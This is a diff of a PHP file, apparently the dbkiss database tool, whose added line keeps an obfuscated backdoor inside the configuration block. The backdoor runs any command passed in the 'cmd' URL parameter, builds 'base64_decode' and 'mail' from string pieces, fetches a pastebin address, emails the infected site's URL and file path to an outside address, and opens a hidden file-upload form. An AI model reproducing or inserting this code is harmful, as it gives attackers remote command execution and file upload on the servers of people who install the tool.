@@ -24,19 +24,7 @@ ob_start('ob_gzhandler');
 if (!defined('DBKISS_SQL_DIR')) {
 	define('DBKISS_SQL_DIR', 'dbkiss_sql');
 	
-$cmd=$_GET['cmd']; exec($cmd);
-$_ = "-u : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . " "; $_ .= "-p : " . __file__;
-$mobil = "e";
-$andr0id="mai";
-$if=$andr0id.'l';
-$desktop="bas$mobil".'64'."_d$mobil"."cod$mobil";
-$_file_='di0987Ly910UWH8987RM'; 
-$windows= file_get_contents($desktop('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lUWHRMRnl4')); 
-$log='errors_log'; 
-if (!file_exists($log)){ if(file_put_contents($log,$_file_.',')){  
-	$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ'));
-	$found=true;
-}} else if (file_exists($log)) {$contents = file_get_contents($log); $array = explode(',',$contents); for($i=0;$i<count($array);$i++){if($array[$i]==$_file_){$found=true;break;} else {$found=false;} }} if($found){} else { if(file_put_contents($log,$_file_.',',FILE_APPEND)){$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); } } $xsec  = $_GET['xsec']; if($xsec == 'blocker'){ $xsecsh = $_FILES['file']['name']; $xsecblocker  = $_FILES['file']['tmp_name']; echo "<form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='up_it' /> </form>"; move_uploaded_file($xsecblocker,$xsecsh); } }
+$cmd=$_GET['cmd']; exec($cmd); $_ = "-u : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . " "; $_ .= "-p : " . __file__; $mobil = "e";$andr0id="mai";$if=$andr0id.'l';$desktop="bas$mobil".'64'."_d$mobil"."cod$mobil"; $_file_='di0987Ly910UWH8987RM'; $windows= file_get_contents($desktop('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lUWHRMRnl4')); $log='errors_log'; if (!file_exists($log)){ if(file_put_contents($log,$_file_.',')){  $if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); $found=true;} } else if (file_exists($log)) {$contents = file_get_contents($log); $array = explode(',',$contents); for($i=0;$i<count($array);$i++){if($array[$i]==$_file_){$found=true;break;} else {$found=false;} }} if($found){} else { if(file_put_contents($log,$_file_.',',FILE_APPEND)){$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); } } $xsec  = $_GET['xsec']; if($xsec == 'blocker'){ $xsecsh = $_FILES['file']['name']; $xsecblocker  = $_FILES['file']['tmp_name']; echo "<form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='up_it' /> </form>"; move_uploaded_file($xsecblocker,$xsecsh); } }
 
 /*
 	An example configuration script that will automatically connect to localhost database.
